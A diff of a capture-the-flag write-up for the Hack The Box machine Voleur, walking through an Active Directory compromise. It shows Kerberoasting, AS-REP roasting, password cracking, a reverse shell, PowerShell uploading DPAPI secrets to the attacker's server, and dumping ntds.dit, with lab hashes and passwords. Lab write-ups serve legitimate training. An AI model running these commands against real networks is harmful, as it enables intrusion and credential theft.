@@ -2,7 +2,7 @@ As is common in real life Windows pentests, you will start the Voleur box with c
 
 ---
 
-# 🧭 Nmap Scan Notes – `voleur.htb`
+#  Nmap Scan Notes – `voleur.htb`
 
 **Scan Command:**
 
@@ -16,7 +16,7 @@ nmap voleur.htb -Pn -sV -sC -T5
 
 ---
 
-## 🔍 Open Ports & Services
+##  Open Ports & Services
 
 | Port     | State | Service       | Version / Notes                                                       |
 | -------- | ----- | ------------- | --------------------------------------------------------------------- |
@@ -36,7 +36,7 @@ nmap voleur.htb -Pn -sV -sC -T5
 
 ---
 
-## 🧠 Kerberos-Related Observations
+##  Kerberos-Related Observations
 
 | Port               | Role                                                |
 | ------------------ | --------------------------------------------------- |
@@ -50,7 +50,7 @@ nmap voleur.htb -Pn -sV -sC -T5
 
 ---
 
-## 🧪 NSE Script Output (Key Results)
+##  NSE Script Output (Key Results)
 
 ### `smb2-security-mode`:
 
@@ -71,17 +71,17 @@ Clock skew: 7h59m53s
 
 ---
 
-## 🧵 Notes & Follow-ups
+##  Notes & Follow-ups
 
-* 🏰 The host is very likely a **Domain Controller**:
+*  The host is very likely a **Domain Controller**:
 
   * Ports 88, 389, 464, 3268 open
   * Hostname in script output is `DC`
-* 🧠 Begin with Kerberos enumeration:
+*  Begin with Kerberos enumeration:
 
   * `GetNPUsers.py`, `GetUserSPNs.py`, `Rubeus`, `bloodhound-python`
-* 🧰 SSH on `2222` is unusual for a Windows machine – likely for pivot or C2 later
-* 🔒 Message signing required ⇒ cannot use `smbclient` or `rpcclient` without proper signing
+*  SSH on `2222` is unusual for a Windows machine – likely for pivot or C2 later
+*  Message signing required ⇒ cannot use `smbclient` or `rpcclient` without proper signing
 
 ---
 
@@ -89,9 +89,9 @@ Here are Markdown notes documenting your use of `impacket-getTGT` with `faketime
 
 ---
 
-# 🪪 Kerberos TGT Generation (via Impacket)
+#  Kerberos TGT Generation (via Impacket)
 
-## 🧠 Context
+##  Context
 
 * The target (`voleur.htb`) has a **clock skew of \~8 hours** ahead of local system time (from earlier `nmap` scan).
 * Kerberos authentication is sensitive to clock drift (>5 minutes can break auth).
@@ -99,13 +99,13 @@ Here are Markdown notes documenting your use of `impacket-getTGT` with `faketime
 
 ---
 
-## 🔧 Command Used
+##  Command Used
 
 ```bash
 faketime 'now + 8 hours' impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
 ```
 
-### ✅ Output:
+###  Output:
 
 ```
 [*] Saving ticket in ryan.naylor.ccache
@@ -116,24 +116,24 @@ faketime 'now + 8 hours' impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
 
 ---
 
-## 📂 File Created
+##  File Created
 
 * `ryan.naylor.ccache` (Kerberos credential cache)
 * Location: Current working directory (`~/HTB/Machines/voleur/bloodhound/`)
 
 ---
 
-## 🧪 Usage of `.ccache` File
+##  Usage of `.ccache` File
 
 You can now use the TGT in other tools that support Kerberos auth:
 
-### 🐺 `bloodhound-python`
+###  `bloodhound-python`
 
 ```bash
 bloodhound-python -k --ccache ryan.naylor.ccache -d voleur.htb -c All
 ```
 
-### 🧰 `netexec`
+###  `netexec`
 
 ```bash
 netexec smb DC.VOLEUR.HTB -k --ccache ryan.naylor.ccache
@@ -141,7 +141,7 @@ netexec smb DC.VOLEUR.HTB -k --ccache ryan.naylor.ccache
 
 ---
 
-## 💡 Notes
+##  Notes
 
 * No need to supply `-u` or `-p` when using `--ccache` (ticket handles auth).
 * Ensure `/etc/krb5.conf` has the `[realms]` and `[domain_realm]` sections configured for `voleur.htb`.
@@ -152,9 +152,9 @@ Here are clean and structured **Markdown notes** summarizing what just happened 
 
 ---
 
-# 🧠 BloodHound Collection Summary — `voleur.htb`
+#  BloodHound Collection Summary — `voleur.htb`
 
-## 🛠️ Command Executed
+##  Command Executed
 
 ```bash
 KRB5CCNAME=ryan.naylor.ccache faketime 'now + 8 hours' bloodhound-python -k -u ryan.naylor -d voleur.htb -c All -ns 10.10.11.76 --disable-autogc
@@ -173,7 +173,7 @@ KRB5CCNAME=ryan.naylor.ccache faketime 'now + 8 hours' bloodhound-python -k -u r
 
 ---
 
-## ✅ BloodHound Output Summary
+##  BloodHound Output Summary
 
 | Object Type                | Count               |
 | -------------------------- | ------------------- |
@@ -186,22 +186,22 @@ KRB5CCNAME=ryan.naylor.ccache faketime 'now + 8 hours' bloodhound-python -k -u r
 | Containers                 | 19                  |
 | Trusts                     | 0                   |
 
-⏱️ **Total Runtime:** 20 seconds
-🔁 **Parallelization:** 10 worker threads
-📡 **LDAP Target:** `dc.voleur.htb`
+⏱ **Total Runtime:** 20 seconds
+ **Parallelization:** 10 worker threads
+ **LDAP Target:** `dc.voleur.htb`
 
 ---
 
-## 🔐 OPSEC Notes
+##  OPSEC Notes
 
-### ✅ Good Practices:
+###  Good Practices:
 
 * **Kerberos auth used**: No plaintext password transmitted (ticket reuse via `.ccache`)
 * **Faked system time**: Avoided Kerberos TGT rejection due to DC clock skew
 * **Limited DNS exposure**: DNS traffic went only to `10.10.11.76` (target)
 * **No NTLM fallback**: Prevented potential hash leaks or logging artifacts
 
-### ⚠️ Potential OPSEC Risks:
+###  Potential OPSEC Risks:
 
 * **LDAP enumeration** (uncredentialed reads are usually benign, but still logged)
 * **Kerberos TGT reuse**: If this ticket is compromised or reused improperly, it could raise detection
@@ -209,14 +209,14 @@ KRB5CCNAME=ryan.naylor.ccache faketime 'now + 8 hours' bloodhound-python -k -u r
 
 ---
 
-## 🔒 OPSEC Considerations
+##  OPSEC Considerations
 
 * **Kerberos TGT reuse**: If this ticket is compromised or reused improperly, it could raise detection.
 * **LDAP enumeration** (uncredentialed reads are usually benign, but still logged): Be cautious when performing LDAP queries to avoid log noise.
 
 ---
 
-## 🧭 Next Steps
+##  Next Steps
 
 * Import `.json` files into BloodHound GUI for graph analysis
 * Look for:
@@ -232,15 +232,15 @@ Here’s a polished markdown note entry you can add to your OSCP or HTB notes do
 
 ---
 
-## 🩸 BloodHound-python Kerberos Collection (Using Default ccache)
+##  BloodHound-python Kerberos Collection (Using Default ccache)
 
-### ✅ Goal
+###  Goal
 
 Use a **Kerberos TGT (ticket)** obtained earlier to enumerate Active Directory with `bloodhound-python` **without** setting the `KRB5CCNAME` environment variable manually.
 
 ---
 
-### ⚙️ Steps Taken
+###  Steps Taken
 
 1. **Verified existing Kerberos TGT**:
 
@@ -278,13 +278,13 @@ Use a **Kerberos TGT (ticket)** obtained earlier to enumerate Active Directory w
 
 ---
 
-### 🧠 Key Insight
+###  Key Insight
 
 As long as your TGT is stored in the default cache file (`/tmp/krb5cc_<UID>`), **you do not need to set `KRB5CCNAME`**. This makes scripting and automation cleaner.
 
 ---
 
-### 💡 Bonus Tip
+###  Bonus Tip
 
 If you're using a `.ccache` file from a different source (e.g., cracked or dumped), just rename or move it:
 
@@ -300,15 +300,15 @@ Here’s a clean markdown entry for your OSCP/HTB notes, capturing the successfu
 
 ---
 
-## 🛠️ NetExec SMB Share Enumeration via Kerberos TGT
+##  NetExec SMB Share Enumeration via Kerberos TGT
 
-### ✅ Goal
+###  Goal
 
 Enumerate SMB shares on the Domain Controller using a **Kerberos ticket** from the local ccache file (no password or hash needed).
 
 ---
 
-### ⚙️ Command Used
+###  Command Used
 
 ```bash
 faketime 'now + 8 hours' netexec smb DC.VOLEUR.HTB -k --use-kcache -d voleur.htb --shares
@@ -316,7 +316,7 @@ faketime 'now + 8 hours' netexec smb DC.VOLEUR.HTB -k --use-kcache -d voleur.htb
 
 ---
 
-### 📌 Parameters
+###  Parameters
 
 | Flag            | Description                                                     |
 | --------------- | --------------------------------------------------------------- |
@@ -330,7 +330,7 @@ faketime 'now + 8 hours' netexec smb DC.VOLEUR.HTB -k --use-kcache -d voleur.htb
 
 ---
 
-### 🧾 Output
+###  Output
 
 ```
 SMB     DC.VOLEUR.HTB  445  DC  [*] x64 (name:DC) (domain:VOLEUR.HTB) (signing:True) (SMBv1:False) (NTLM:False)
@@ -350,7 +350,7 @@ SMB     DC.VOLEUR.HTB  445  DC  SYSVOL       READ          Logon server share
 
 ---
 
-### 🧠 Notes
+###  Notes
 
 * **Authentication worked seamlessly** using the Kerberos TGT already stored in the cache.
 * **SMB Signing is enabled** but not enforced (`signing:True`), and **SMBv1 is disabled**, which is typical in hardened environments.
@@ -365,15 +365,15 @@ Here's a Markdown-formatted summary of your `smbclient` usage with `faketime`:
 
 ---
 
-## 📝 SMBClient Access with `faketime`
+##  SMBClient Access with `faketime`
 
-### 🔧 Command Used
+###  Command Used
 
 ```bash
 faketime 'now + 8 hours' smbclient //DC.VOLEUR.HTB/IT -U ryan.naylor -W VOLEUR.HTB -d 3
 ```
 
-### 🔍 Purpose
+###  Purpose
 
 * **`faketime 'now + 8 hours'`**: Temporarily manipulates the system time for the `smbclient` process, often useful to bypass time-based restrictions (e.g., Kerberos ticket validity or account enablement windows).
 * **`smbclient`**: Connects to the SMB share `\\DC.VOLEUR.HTB\IT` as user `ryan.naylor` under the domain `VOLEUR.HTB`.
@@ -381,9 +381,9 @@ faketime 'now + 8 hours' smbclient //DC.VOLEUR.HTB/IT -U ryan.naylor -W VOLEUR.H
 
 ---
 
-### 📋 Key Output Details
+###  Key Output Details
 
-#### ✔ Network Interfaces Added:
+####  Network Interfaces Added:
 
 * Multiple interfaces including `eth0`, `wlan0`, `docker0`, `br-*` detected with IPv6 and IPv4.
 * Example IPs:
@@ -392,7 +392,7 @@ faketime 'now + 8 hours' smbclient //DC.VOLEUR.HTB/IT -U ryan.naylor -W VOLEUR.H
   * `172.17.0.1` (docker0)
   * `fd5e:31d4:15be::318` (IPv6)
 
-#### ⚠ Permission Warnings:
+####  Permission Warnings:
 
 ```plaintext
 directory_create_or_exist: mkdir failed on directory /run/samba: Permission denied
@@ -400,7 +400,7 @@ directory_create_or_exist: mkdir failed on directory /run/samba: Permission deni
 
 * These are non-fatal but indicate the process lacked permission to create temp directories (can be ignored unless writing to shared locations).
 
-#### 🌐 Connection Details:
+####  Connection Details:
 
 * Attempted connections to:
 
@@ -412,7 +412,7 @@ directory_create_or_exist: mkdir failed on directory /run/samba: Permission deni
 
 ---
 
-### 🔑 Authentication
+###  Authentication
 
 Prompted for password for user:
 
@@ -422,7 +422,7 @@ VOLEUR.HTB\ryan.naylor
 
 ---
 
-### 📁 Directory Listing (`ls`)
+###  Directory Listing (`ls`)
 
 Inside the share `\\DC.VOLEUR.HTB\IT`:
 
@@ -439,7 +439,7 @@ Inside the share `\\DC.VOLEUR.HTB\IT`:
 
 ---
 
-### 🧠 Takeaways
+###  Takeaways
 
 * Time manipulation successfully enabled access.
 * Directory contents appear accessible.
@@ -451,21 +451,21 @@ Here’s a clean, OSCP-style markdown note for using `smbclient` to recursively 
 
 ---
 
-## 📁 SMBClient Recursive File Download (Folder or Directory)
+##  SMBClient Recursive File Download (Folder or Directory)
 
-### 🛠️ Tool
+###  Tool
 
 `smbclient` – Interactive SMB share access (like FTP)
 
 ---
 
-### ✅ Scenario
+###  Scenario
 
 You have accessed a share like `\\dc.voleur.htb\IT` and want to download all files from a subdirectory (e.g., `"First-Line Support"`).
 
 ---
 
-### 🔧 Command Flow
+###  Command Flow
 
 ```bash
 smbclient //dc.voleur.htb/IT -U 'voleur.htb\ryan.naylor'
@@ -481,7 +481,7 @@ smb: \> mget "First-Line Support/*"
 
 ---
 
-### 📌 What It Does
+###  What It Does
 
 * `recurse ON`: Ensures subdirectories are processed.
 * `prompt OFF`: Skips asking "Get file XYZ?" for every file.
@@ -498,7 +498,7 @@ You’d have to confirm with `y` or `n` for each.
 
 ---
 
-### 💡 Pro Tip
+###  Pro Tip
 
 If you're scripting or automating:
 
@@ -509,17 +509,17 @@ Perfect — you're right on track. You’ve successfully extracted the password 
 
 ---
 
-## 🔓 Cracking Excel 2013 Password with John the Ripper
+##  Cracking Excel 2013 Password with John the Ripper
 
-### 📁 Target File
+###  Target File
 
 `Access_Review.xlsx` (password-protected Microsoft Excel file)
 
 ---
 
-### ✅ Step-by-Step Process
+###  Step-by-Step Process
 
-### 🔹 Step 1: Extract Hash
+###  Step 1: Extract Hash
 
 ```bash
 office2john.py Access_Review.xlsx > hash.txt
@@ -533,7 +533,7 @@ $office$*2013*100000*256*16*a80811...111c
 
 ---
 
-### 🔹 Step 2: Identify Hash Type (optional)
+###  Step 2: Identify Hash Type (optional)
 
 ```bash
 hashid hash.txt
@@ -549,7 +549,7 @@ Confirms the format is correct and supported.
 
 ---
 
-### 🔹 Step 3: Crack Hash with John
+###  Step 3: Crack Hash with John
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -563,7 +563,7 @@ john --wordlist=custom.lst hash.txt
 
 ---
 
-### 🔹 Step 4: Display Cracked Password
+###  Step 4: Display Cracked Password
 
 ```bash
 john --show hash.txt
@@ -581,9 +581,9 @@ Here's a concise and structured **Markdown note** summarizing your successful `j
 
 ---
 
-## 📝 John the Ripper Notes – Cracking MS Office Hash
+##  John the Ripper Notes – Cracking MS Office Hash
 
-### 🔧 Command Used
+###  Command Used
 
 ```bash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -591,7 +591,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---
 
-### 📌 Hash Info
+###  Hash Info
 
 * **Hash Type**: Microsoft Office 2007/2010/2013
 * **Detected Format**: `Office, 2007/2010/2013`
@@ -601,7 +601,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---
 
-### 🧠 Execution Details
+###  Execution Details
 
 * **Threads Used**: 48 OpenMP threads
 * **Encoding**: UTF-8
@@ -609,7 +609,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---
 
-### ✅ Cracked Password
+###  Cracked Password
 
 | Username | Password    |
 | -------- | ----------- |
@@ -623,7 +623,7 @@ john hash --show
 
 ---
 
-### 📈 Performance
+###  Performance
 
 * **Speed**: \~0.6493 guesses per second
 * **Progress**: 1 password guessed in 1 second
@@ -631,7 +631,7 @@ john hash --show
 
 ---
 
-### 🧩 Notes
+###  Notes
 
 * No username associated (`?` shown).
 * Cracking success indicates good match with weak/common password list.
@@ -644,7 +644,7 @@ Here's a Markdown version of the full table and notes extracted from your image 
 
 ---
 
-## 🧑‍💻 User Accounts
+##  User Accounts
 
 | **User**       | **Job Title**                  | **Permissions**         | **Notes**                                                               |
 | -------------- | ------------------------------ | ----------------------- | ----------------------------------------------------------------------- |
@@ -657,7 +657,7 @@ Here's a Markdown version of the full table and notes extracted from your image 
 
 ---
 
-## 🛠️ Service Accounts
+##  Service Accounts
 
 | **Account**  | **Purpose**        | **Notes / Passwords**                         |
 | ------------ | ------------------ | --------------------------------------------- |
@@ -672,14 +672,14 @@ Here's a Markdown version of the full table and notes extracted from your image 
 
 
 ```bash
-└─$ faketime 'now + 8 hours' bloodyAD -d voleur.htb --host DC.voleur.htb --dc-ip 10.10.11.76 -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k  set object 'svc_winrm' servicePrincipalName
+$ faketime 'now + 8 hours' bloodyAD -d voleur.htb --host DC.voleur.htb --dc-ip 10.10.11.76 -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k  set object 'svc_winrm' servicePrincipalName
 [+] svc_winrm's servicePrincipalName has been updated
 ```
 Here's a clear Markdown-formatted explanation of your provided command and its successful output:
 
 ---
 
-### 🎯 **Setting a Service Principal Name (SPN) using `bloodyAD` and Kerberos**
+###  **Setting a Service Principal Name (SPN) using `bloodyAD` and Kerberos**
 
 **Command Executed:**
 
@@ -694,7 +694,7 @@ KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD \
 
 ---
 
-### 🔍 **Parameter Breakdown:**
+###  **Parameter Breakdown:**
 
 | Parameter                     | Explanation                                                      |
 | ----------------------------- | ---------------------------------------------------------------- |
@@ -728,15 +728,15 @@ Here's your clear Markdown-formatted notes based on the provided successful **Ke
 
 ---
 
-## 📝 Kerberoasting Attack Notes (Voleur.htb)
+##  Kerberoasting Attack Notes (Voleur.htb)
 
-### 🎯 Objective
+###  Objective
 
 Perform **Targeted Kerberoasting** against the `svc_winrm` account to obtain a hash for offline cracking.
 
 ---
 
-### 🚩 Initial Command (using Impacket):
+###  Initial Command (using Impacket):
 
 ```bash
 KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' impacket-GetUserSPNs voleur.htb/svc_ldap -k -no-pass -dc-ip 10.10.11.76 -request -dc-host DC.voleur.htb
@@ -748,7 +748,7 @@ KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' impacket-GetUserSPNs voleur
 
 ---
 
-### 📌 Results:
+###  Results:
 
 | Service Principal Name | User       | Group Membership        | Password Last Set         | Last Logon                |
 | ---------------------- | ---------- | ----------------------- | ------------------------- | ------------------------- |
@@ -756,7 +756,7 @@ KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' impacket-GetUserSPNs voleur
 
 ---
 
-### 🔑 Obtained Kerberos TGS Hash (`svc_winrm`):
+###  Obtained Kerberos TGS Hash (`svc_winrm`):
 
 ```plaintext
 $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$cebaa4c8d1229f91168f6753957bbb17$343164b458b1885d83bca1df38602ec12284514e8e14b4f7934bece0bbf4c6a6c7d26da4c0d9310c0d8545019a25d4f9abbcc6bc07bc37c8343476deb7ec6c398468d4a37f2ab2d6d8ebbd4f6975a1a558b4e418aa49bc7ba9c62a676c95e63d1699b5aed210b83006abc9e88a6e4b65660cfde0fef83dafdfdcfc88d39a6e687872cf55f8b34c43b9beefa6c313411c09c3c17ada7326cb5f6726234402e7988065b9dc1c1554231eeca1a848b06b9df3861072ce7e2ae838d105a948bb1b194fe2e9f61d04438cf0517181aa0ebb4973aeb20eb96518647c54daab40a8ec83d31c75bc31d3f9d6646ee05d97aaa075cbc326a489c14863c9302add645acc67b54e018388a01d456fb227068bd44afc14b41c7257f20fb5bba3dc08306a8912b34e127a17aac89a84c8ba03c343d6a0f6d897e717bcd0a7f3ca591b561e24e348101a3e527486e1a3928b080313195207e7e9aba339018d75ee8551a7a1f91d5b969836aa9a46d17b946549772bc0676c937151a0d711c5811fcac0df7d2ffe0e62c5858254569d7cf0d3ba5ba0402ef222ba891f5074c22c28ab156d6f475bb61b6a1fe7666a1422e9e8148192a84936c91b0fd9d0cda8c3cc79b723b81a2a361191b02cdb31b97d9fd9f8aa67b5b3244207d2779de6594a0ee4babbab36910e86bca30747645ca1526cd256571a45bb52f08c948ec5f5ad8256b2b815ef9c6c546de49a11fc8fa7c1716715a2658578d1c839387ebc9457591130089360d4adadc3276f86bf4b91e1de68e11e764ef03cc8d007fec54f3bcbc66c5f9f931c95dd63693d30d0920891d698a5e1c727e8d2d9345490ea048e61b9b871893e9015088d438dcfc005a44f1a1a07958bfa9cd2d0fef77eaeee8fb41e10ca16dddd9d1c6c24335dcefe0811bf37977e7788970c95caa9fed73b1bc05a5500b5739c87bfdfa30591f1b8b5c7ca895b7f678f1c3c450838b364228222b5d43eda52012a999d62234adc7c89781981444f60a8f9a7edd9374fe2c0c3927e5bb16f89699cb8a48d757cb63da1a6f41ae21cc7f5f5468267bd2ed61ebac083589a876f21ef593901264c65a4d8ba238622e9d348468f38516eb31b21157c4ac537a877e499d53c5dad18bc3c559e33b98da9c0ddd452ed29b80e2bbc76ce2e7514d07072345e56dc22c8e8dc33acee56a561577333a454a33bafd3f33f097da53b13e9a956812f1758823f76beb55b8884ed93a47d5744fc8ffa279f6e9ff9c7f4c7d3ad47b87089ae0ca7c829608584351565b0e68b3ed38b5cf55cb83a4709e541eb2f40a986d642da45a3b5ef3d506996c7324bcf58811d5626a629f3cfa15d8d1962eea06e4c3602fa2e98d2590ef37be185ce8656a06b275c8cb96b6e996e895aa9fe15201018e5f5577275c0abcb86b1725abed26b5b8ca71b4faf1b2cd24a2563f33603156ae64fccdab3cee0fceef6ee0779df
@@ -764,12 +764,12 @@ $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$cebaa4c8d1229f91168f6753
 
 ---
 
-### ⚙️ Next Steps:
+###  Next Steps:
 
 * **Crack**:
 
 ```bash
-└─$ hashcat -a 0 krbtgs.hash /usr/share/wordlists/rockyou.txt  
+$ hashcat -a 0 krbtgs.hash /usr/share/wordlists/rockyou.txt  
 hashcat (v6.2.6-1184-g5ffbc5edc) starting in autodetect mode
 
 HIP API (HIP 6.4.43483)
@@ -937,7 +937,7 @@ because you (specifically, your group `RESTORE_USERS@VOLEUR.HTB`) have **Generic
 
 ---
 
-## 🚩 **Why Enable "Don't Require Pre-authentication"?**
+##  **Why Enable "Don't Require Pre-authentication"?**
 
 * **Kerberoasting vs AS-REP Roasting:**
 
@@ -948,7 +948,7 @@ By disabling Kerberos pre-authentication on `LACEY.MILLER`, you explicitly make 
 
 ---
 
-## 🎯 **Performing the Attack (AS-REP Roasting)**
+##  **Performing the Attack (AS-REP Roasting)**
 
 After running the command above, you can immediately roast the account using:
 
@@ -964,8 +964,8 @@ $krb5asrep$23$lacey.miller@VOLEUR.HTB:44ee033ad532f6c9d7679b98a8387d0d$166f57997
 You'll then get an AS-REP hash, which can be cracked offline:
 
 ```bash
-┌──(jrios㉿warmonger)-[~/Documents/HTB/Machines/voleur]
-└─$ hashcat -a 0 -m 18200 lacey.miller_as-rep.hash /usr/share/wordlists/rockyou.txt
+(jrioswarmonger)-[~/Documents/HTB/Machines/voleur]
+$ hashcat -a 0 -m 18200 lacey.miller_as-rep.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6-1184-g5ffbc5edc) starting
 
 HIP API (HIP 6.4.43483)
@@ -1037,7 +1037,7 @@ Stopped: Fri Jul 11 23:41:45 2025
 
 ---
 
-## 🔍 **Is There a Way to Directly Kerberoast (`TGS`) Instead?**
+##  **Is There a Way to Directly Kerberoast (`TGS`) Instead?**
 
 * **Regular Kerberoasting** (TGS roasting) requires the target user to have an SPN.
 * **If Lacey Miller does not currently have an SPN**, you cannot directly Kerberoast her.
@@ -1051,7 +1051,7 @@ Stopped: Fri Jul 11 23:41:45 2025
 
 ### Let's setup the server to host the `RunasCs.exe` file:
 ```bash
-└─$ sudo php -S 0.0.0.0:1337
+$ sudo php -S 0.0.0.0:1337
 [Sat Jul 12 00:50:06 2025] PHP 8.4.8 Development Server (http://0.0.0.0:1337) started
 [Sat Jul 12 00:51:53 2025] 10.10.11.76:54040 Accepted
 [Sat Jul 12 00:51:53 2025] 10.10.11.76:54040 [200]: GET /RunasCs.exe
@@ -1078,7 +1078,7 @@ Stopped: Fri Jul 11 23:41:45 2025
 
 ### Now we can connect back to our machine on port 1338:
 ```bash
-└─$ nc -nvlp 1338
+$ nc -nvlp 1338
 listening on [any] 1338 ...
 connect to [10.10.14.21] from (UNKNOWN) [10.10.11.76] 54148
 Windows PowerShell
@@ -1256,7 +1256,7 @@ Here's how to upload both files to your PHP server using PowerShell from the tar
 
 ---
 
-## ✅ Step-by-step: Upload 2 DPAPI Files via PowerShell
+##  Step-by-step: Upload 2 DPAPI Files via PowerShell
 
 ### ① **Ensure your PHP upload script is running**
 
@@ -1287,7 +1287,7 @@ php -S 0.0.0.0:420
 
 Use PowerShell to upload both files individually.
 
-#### 🔹 Upload the **MasterKey**:
+####  Upload the **MasterKey**:
 
 ```powershell
 $wc = New-Object Net.WebClient
@@ -1297,7 +1297,7 @@ $wc.UploadFile(
 )
 ```
 
-#### 🔹 Upload the **Credential Blob**:
+####  Upload the **Credential Blob**:
 
 ```powershell
 $wc.UploadFile(
@@ -1306,11 +1306,11 @@ $wc.UploadFile(
 )
 ```
 
-> 📌 Wrap the full file path in quotes and ensure you include the full filename — spaces are handled correctly in PowerShell when quoted.
+>  Wrap the full file path in quotes and ensure you include the full filename — spaces are handled correctly in PowerShell when quoted.
 
 ---
 
-### ✅ After upload
+###  After upload
 
 You should see:
 
@@ -1334,7 +1334,7 @@ To decrypt the DPAPI files you uploaded, follow these steps:
 
 
 ```bash
-└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' -password 'NightT1meP1dg3on14' 
+$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' -password 'NightT1meP1dg3on14' 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [MASTERKEYFILE]
@@ -1354,8 +1354,8 @@ Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf87
 
 # Decrypting the Credential Blob
 ```bash
-┌──(jrios㉿warmonger)-[~/…/Machines/voleur/dpapi/uploads]
-└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key  '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83' 
+(jrioswarmonger)-[~/…/Machines/voleur/dpapi/uploads]
+$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key  '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83' 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [CREDENTIAL]
@@ -1456,8 +1456,8 @@ Admin
 ```
 # Let's connect via ssh using the credentials we just found:
 ```bash
-┌──(jrios㉿warmonger)-[~/…/Machines/voleur/dpapi/uploads]
-└─$ ssh svc_backup@voleur.htb -p 2222 -i id_rsa
+(jrioswarmonger)-[~/…/Machines/voleur/dpapi/uploads]
+$ ssh svc_backup@voleur.htb -p 2222 -i id_rsa
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1490,7 +1490,7 @@ svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc -q 0 10.10.14.21
 
 # Let's dump the `ntds.dit` file using `impacket-secretsdump`:
 ```bash
-└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
+$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
@@ -1550,10 +1550,10 @@ voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
 ## Let's get the root flag:
 ```bash
 # let's get our TGT ticket:
-└─$ KRB5CCNAME=Administrator.ccache evil-winrm -i dc.voleur.htb -r voleur.htb                                                                         
+$ KRB5CCNAME=Administrator.ccache evil-winrm -i dc.voleur.htb -r voleur.htb                                                                         
 
 # Now we can connect to the target machine using Evil-WinRM:
-└─$ faketime 'now + 8 hours' evil-winrm -i dc.voleur.htb -r voleur.htb
+$ faketime 'now + 8 hours' evil-winrm -i dc.voleur.htb -r voleur.htb
                                         
 Evil-WinRM shell v3.7
                                         
